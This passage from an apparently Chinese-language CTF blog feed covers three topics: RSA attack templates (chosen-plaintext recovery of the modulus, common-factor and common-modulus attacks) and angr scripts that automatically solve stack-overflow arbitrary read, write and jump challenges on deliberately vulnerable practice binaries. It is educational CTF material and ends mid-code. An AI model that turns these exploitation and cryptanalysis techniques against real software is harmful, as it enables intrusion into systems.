class="header-anchor">#</a></h3><p>多个因子时，我们根据欧拉函数求得对应的$\varphi(n)$即可</p><p>$$\varphi(x)=x\prod_{i=1}^n (1-1/p_i)$$</p><p>其中$p_i$是$x$的所有质因数</p><h2><span id="pxuan-ze-ming-wen-gong-ji">选择明文攻击</span><a href="#pxuan-ze-ming-wen-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>存在一个加密$Oracle$，能够返回加密后的密文。求出对应的$e$和$n$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><h4><span id="pqiu-jie-e">求解e</span><a href="#pqiu-jie-e" class="header-anchor">#</a></h4><p>当$e$较小时，可以通过$sage$的$bsgs$函数求得$e$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage -python script.py</span></span><br><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line">n = </span><br><span class="line">n = Zmod(n)</span><br><span class="line">m = </span><br><span class="line">m = ZmodN(m)</span><br><span class="line">c = </span><br><span class="line">c = ZmodN(c)</span><br><span class="line">print(bsgs(m,c,(<span class="number">3</span>, <span class="number">2</span> ** <span class="number">40</span>)))</span><br></pre></td></tr></table></figure><h4><span id="pqiu-jie-n">求解n</span><a href="#pqiu-jie-n" class="header-anchor">#</a></h4><p>分别加密$2、4、8、16…$</p><p>我们可以得到：</p><p>$$c_2 = 2^e \mod n$$</p><p>$$c_4 = 4^e \mod n$$</p><p>$$c_8 = 8^e \mod n$$</p><p>那么：</p><p>$$c_2^2 \equiv c_4 \mod n$$</p><p>$$c_2^3 \equiv c_8 \mod n$$</p><p>所以有：</p><p>$$c_2^2 -c_4 = kn$$</p><p>$$c_2^3 -c_8 = tn$$</p><p>最后求得他们的公因子就是$n$，使用的$Oracle$数据越多，公因子是$n$的概率越大</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"m: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">c2 = int(p.recvline())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"m: "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">c4 = int(p.recvline())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"m: "</span>)</span><br><span class="line">p.sendline(<span class="string">"8"</span>)</span><br><span class="line">c8 = int(p.recvline())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"m: "</span>)</span><br><span class="line">p.sendline(<span class="string">"16"</span>)</span><br><span class="line">c16 = int(p.recvline())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"m: "</span>)</span><br><span class="line">p.sendline(<span class="string">"32"</span>)</span><br><span class="line">c32 = int(p.recvline())</span><br><span class="line"></span><br><span class="line">pn = pow(c2,<span class="number">2</span>)-c4</span><br><span class="line">qn = pow(c2,<span class="number">3</span>)-c8</span><br><span class="line">rn = pow(c2,<span class="number">4</span>)-c16</span><br><span class="line">sn = pow(c2,<span class="number">5</span>)-c32</span><br><span class="line"></span><br><span class="line">l = []</span><br><span class="line">n = libnum.xgcd(pn,qn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = libnum.xgcd(pn,rn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = libnum.xgcd(pn,sn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = libnum.xgcd(qn,rn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = libnum.xgcd(qn,sn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = libnum.xgcd(rn,sn)[<span class="number">2</span>]</span><br><span class="line">l.append(n)</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span>(l.count(_)&gt;=<span class="number">3</span>):</span><br><span class="line">        n = _</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>):</span><br><span class="line">    print(<span class="string">"nope"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"n:"</span>,n)</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-wen-xian">参考文献</span><a href="#pcan-kao-wen-xian" class="header-anchor">#</a></h2><ul><li><a href="https://github.com/ctf-wiki/ctf-wik" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wik</a></li><li><a href="https://code.felinae98.cn/ctf/crypto/rsa-parity-oracle/" target="_blank" rel="noopener">https://code.felinae98.cn/ctf/crypto/rsa-parity-oracle/</a></li><li><a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">https://xz.aliyun.com/t/2446</a></li><li><a href="https://github.com/ius/rsatool/blob/master/rsatool.py" target="_blank" rel="noopener">https://github.com/ius/rsatool/blob/master/rsatool.py</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着AngrCTF学Angr(3)</title>
    <url>/f7e7b79c.html</url>
    <content><![CDATA[<blockquote><p>第三部分是一些漏洞自动化利用相关的内容</p></blockquote><p><strong>PS</strong>:<br><code>angr == 8.20.1.7</code><br>二进制文件和脚本存储于<code>https://github.com/ycdxsb/Challenges/tree/master/angr_ctf</code></p><a id="more"></a><h2><span id="pzhan-yi-chu-li-yong-ren-yi-du">栈溢出利用——任意读</span><a href="#pzhan-yi-chu-li-yong-ren-yi-du" class="header-anchor">#</a></h2><ul><li><code>15_angr_arbitrary_read</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s = try_again;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %20s"</span>, &amp;key, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0xBA9057</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( key == <span class="number">0x1B2DDE3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能够看到存在简单的溢出，v4长度为0x10，但由于读入20个字符，因此能够覆盖掉s的内容</p><p>题目的目的是为了让我们使用angr，自动化的对溢出进行利用，覆盖s的内容为&quot;Good Job&quot;地址，从而修改程序输出为&quot;Good Job&quot;</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string, key_address, input_address)</span>:</span></span><br><span class="line">            scanf0 = claripy.BVS(<span class="string">'scanf0'</span>, <span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            scanf1 = claripy.BVS(<span class="string">'scanf1'</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> chr <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">                <span class="comment"># 32&lt;=ch&lt;=127</span></span><br><span class="line">                self.state.add_constraints(chr &gt;= <span class="string">'0'</span>, chr &lt;= <span class="string">'z'</span>)</span><br><span class="line"></span><br><span class="line">            self.state.memory.store(</span><br><span class="line">                key_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(</span><br><span class="line">                input_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">            self.state.globals[<span class="string">'solution0'</span>] = scanf0</span><br><span class="line">            self.state.globals[<span class="string">'solution1'</span>] = scanf1</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">'__isoc99_scanf'</span></span><br><span class="line">    project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_puts</span><span class="params">(state)</span>:</span></span><br><span class="line">        <span class="comment"># 检查puts函数参数是否为’Good Job‘地址</span></span><br><span class="line">        puts_parameter = state.memory.load(</span><br><span class="line">            state.regs.esp+<span class="number">4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line">        <span class="comment"># 在进入puts时检查，由于参数调用的约定，此时esp+4开始的4个字节为puts参数</span></span><br><span class="line">        <span class="keyword">if</span>(state.solver.symbolic(puts_parameter)):</span><br><span class="line">            good_job_address = <span class="number">0x50514957</span></span><br><span class="line">            is_vulnerable_expression = puts_parameter == good_job_address</span><br><span class="line">            </span><br><span class="line">            copied_state=state.copy()</span><br><span class="line">            copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">if</span>(copied_state.satisfiable()):</span><br><span class="line">                state.add_constraints(is_vulnerable_expression)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">        puts_address = <span class="number">0x8048370</span>  </span><br><span class="line">        <span class="keyword">if</span>(state.addr == puts_address):</span><br><span class="line">            <span class="keyword">return</span> check_puts(state)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    sim.explore(find=is_successful)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.solver.eval(solution_state.globals[<span class="string">'solution0'</span>],cast_to=int)</span><br><span class="line">        solution1 = solution_state.solver.eval(solution_state.globals[<span class="string">'solution1'</span>], cast_to=bytes)        </span><br><span class="line">        print(solution0,solution1[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h2><span id="pzhan-yi-chu-li-yong-ren-yi-xie">栈溢出利用——任意写</span><a href="#pzhan-yi-chu-li-yong-ren-yi-xie" class="header-anchor">#</a></h2><ul><li><code>16_angr_arbitrary_write</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  dest = unimportant_buffer;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">strncpy</span>(password_buffer, <span class="string">"PASSWORD"</span>, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %20s"</span>, &amp;key, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">26300398</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(unimportant_buffer, &amp;s, <span class="number">0x10</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( key == <span class="number">55551743</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, &amp;s, <span class="number">0x10</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(unimportant_buffer, &amp;s, <span class="number">0x10</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password_buffer, <span class="string">"QOOCPPEV"</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到一样是栈溢出，s长度为0x10,但读入了20字节，可以覆盖dest内容。</p><p>因此题目目的是，覆盖dest地址为password_buffer地址，当key等于55551743时，会将s的前16字节赋值给password_buffer，最后输出&quot;Good Job&quot;</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string, key_address, input_address)</span>:</span></span><br><span class="line">            scanf0 = claripy.BVS(<span class="string">'scanf0'</span>, <span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            scanf1 = claripy.BVS(<span class="string">'scanf1'</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> chr <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">                <span class="comment"># 32&lt;=ch&lt;=127</span></span><br><span class="line">                self.state.add_constraints(chr &gt;= <span class="string">'0'</span>, chr &lt;= <span class="string">'z'</span>)</span><br><span class="line"></span><br><span class="line">            self.state.memory.store(</span><br><span class="line">                key_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(</span><br><span class="line">                input_address, scanf1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">            self.state.globals[<span class="string">'solution0'</span>] = scanf0</span><br><span class="line">            self.state.globals[<span class="string">'solution1'</span>] = scanf1</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">'__isoc99_scanf'</span></span><br><span class="line">    project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_strncpy</span><span class="params">(state)</span>:</span></span><br><span class="line">        strncpy_src = state.memory.load(state.regs.esp+<span class="number">8</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">        strncpy_dest = state.memory.load(state.regs.esp+<span class="number">4</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">        strncpy_len = state.memory.load(state.regs.esp+<span class="number">12</span>,<span class="number">4</span>,endness=project.arch.memory_endness)</span><br><span class="line">        src_contents = state.memory.load(strncpy_src, strncpy_len)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(state.solver.symbolic(strncpy_dest) <span class="keyword">and</span> state.solver.symbolic(src_contents)):</span><br><span class="line">            password = <span class="string">"QOOCPPEV"</span></span><br><span class="line">            password_address = <span class="number">0x59554248</span></span><br><span class="line">            </span><br><span class="line">            does_src_hold_password = src_contents[<span class="number">-1</span>:<span class="number">-64</span>] == password</span><br><span class="line">            does_dest_equal_buffer_address = password_address==strncpy_dest</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> state.satisfiable(extra_constraints=(does_src_hold_password, does_dest_equal_buffer_address)):</span><br><span class="line">                state.add_constraints(does_src_hold_password, does_dest_equal_buffer_address)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span><span class="params">(state)</span>:</span></span><br><span class="line">        strncpy_address = <span class="number">0x8048410</span>  </span><br><span class="line">        <span class="keyword">if</span>(state.addr == strncpy_address):</span><br><span class="line">            <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    sim.explore(find=is_successful)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.solver.eval(solution_state.globals[<span class="string">'solution0'</span>],cast_to=int)</span><br><span class="line">        solution1 = solution_state.solver.eval(solution_state.globals[<span class="string">'solution1'</span>], cast_to=bytes)        </span><br><span class="line">        print(solution0,solution1[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h2><span id="pzhan-yi-chu-li-yong-ren-yi-tiao-zhuan">栈溢出利用——任意跳转</span><a href="#pzhan-yi-chu-li-yong-ren-yi-tiao-zhuan" class="header-anchor">#</a></h2><ul><li><code>17_angr_arbitrary_jump</code></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int read_input()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+<span class="number">4</span>h] [ebp<span class="number">-24</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">"%s"</span>, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到scanf存在栈溢出，所以是让我们通过简单的ROP，来跳转到<code>print_good</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self, format_string, input_buffer_address)</span>:</span></span><br><span class="line">            input_buffer = claripy.BVS(</span><br><span class="line">                <span class="string">'input_buffer'</span>, <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># 设置一个较大的input_buffer</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> input_buffer.chop(bits=<span class="number">8</span>):</span><br><span class="line">                self.state.add_constraints(char &gt;= <span class="string">'0'</span>, char &lt;= <span class="string">'z'</span>)</span><br><span class="line"></span><br><span class="line">            self.state.memory.store(</span><br><span class="line">                input_buffer_address, input_buffer, endness=project.arch.memory_endness)</span><br><span class="line">            self.state.globals[<span class="string">'solution'</span>] = input_buffer</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">'__isoc99_scanf'</span></span><br><span class="line">    project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line">    sim = project.factory.simgr(init_state, save_unconstrained=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_unconstrained</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(sim.unconstrained) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_active</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(sim.active) &gt; <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    solution_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_found_solution</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> solution_state <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((has_active() <span class="keyword">or</span> has_unconstrained()) <span class="keyword">and</span> (<span class="keyword">not</span> has_found_solution())):</span><br><span class="line">        <span class="keyword">for</span> unconstrained_state <span class="keyword">in</span> sim.unconstrained:</span><br><span class="line">            eip = unconstrained_state.regs.eip</span><br><span class="line">            print_good_address = <span class="number">0x52425359</span></span><br><span class="line">            <span class="keyword">if</span>(unconstrained_state.satisfiable(extra_constraints=[(eip == print_good_address)])):</span><br><span class="line">                solution_state = unconstrained_state</span><br><span class="line">                solution_state.add_constraints(eip == print_good_address)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sim.drop(stash=<span class="string">'unconstrained'</span>)</span><br><span class="line">        sim.step()</span><br><span class="line">               </span><br><span class="line">    <span class="keyword">if</span> solution_state:</span><br><span class="line">        solution = solution_state.solver.eval(</span><br><span class="line">            solution_state.globals[<span class="string">'solution'</span>], cast_to=bytes)</span><br><span class="line">        print(solution[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中的RSA基本套路(1)</title>
    <url>/509b3160.html</url>
    <content><![CDATA[<blockquote><p>碰到东西老是忘老是忘，要用的时候总是得自己去搜索模板浪费时间，所以只能整理整理一下套路和解题模板才能活下去这样子</p></blockquote><p>依赖库：</p><ul><li>gmpy2</li><li>pycrypto</li></ul><a id="more"></a><h2><span id="prsa-yuan-li">RSA原理</span><a href="#prsa-yuan-li" class="header-anchor">#</a></h2><p>私钥$n$,$d$，公钥$n$,$e$。其中n是两个素数$p$,$q$的乘积。$c$为密文，$m$为明文。$\varphi(n)$为欧拉函数。其中:$d$是$e$模$\varphi(n)$的逆元。我们有<br>$$ \varphi(n) = (p-1)(q-1) $$</p><p>$$ed \equiv 1 \mod \varphi(n)$$</p><p>$$ encrypt:c \equiv m^e \mod n $$</p><p>$$ decrypt:m \equiv c^d \mod n $$</p><h2><span id="popenssl-shi-yong">openssl使用</span><a href="#popenssl-shi-yong" class="header-anchor">#</a></h2><p>使用<code>openssl</code>查看<code>pem</code>文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in public.pem</span><br></pre></td></tr></table></figure><p>使用<code>openssl</code>和私钥解密</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag -inkey privatekey -out flag.txt</span><br></pre></td></tr></table></figure><h2><span id="pchang-gui">常规</span><a href="#pchang-gui" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>已知$p$、$q$、$c$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>求$\varphi(n)$，再求出$d$即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = p*q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = </span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">c = </span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2><span id="pmo-bu-hu-su">模不互素</span><a href="#pmo-bu-hu-su" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>已知如下：</p><p>$$n_1 = p \times q_1 $$</p><p>$$ n_2=p \times q_2 $$</p><p>$$c_1= m^e \mod n_1 $$</p><p>$$c_2 = m^e \mod n_2$$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>求出$n_1$和$n_2$的公因子，即可解得$p$和$q$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> xgcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line">n1 = </span><br><span class="line">n2 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e = </span><br><span class="line">p = xgcd(n1,n2)[<span class="number">2</span>]</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">phi1=(p<span class="number">-1</span>)*(q1<span class="number">-1</span>)</span><br><span class="line">phi2=(p<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d1 = inverse(e,phi1)</span><br><span class="line">d2 = inverse(e,phi2)</span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line">print(long_to_bytes(m1))</span><br><span class="line">print(long_to_bytes(m2))</span><br></pre></td></tr></table></figure><h2><span id="pgong-mo-gong-ji">共模攻击</span><a href="#pgong-mo-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>模数$n$相同，指数$e_1、e_2$不同且互质</p><p>已知：</p><p>$$c_1=m^{e_1}\mod n$$</p><p>$$c_2 = m^{e_2}\mod n$$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>根据扩展欧几里得算法求出$re_1+se_2=1 \mod n$的整数$r、s$</p><p>根据<br>$$\begin{equation}<br>c_{1}^{r} c_{2}^{s} \equiv m^{r e_{1}} m^{s e_{2}} \bmod n \equiv m \mod n<br>\end{equation}$$<br>得到明文</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> xgcd</span><br><span class="line"><span class="keyword">from</span> 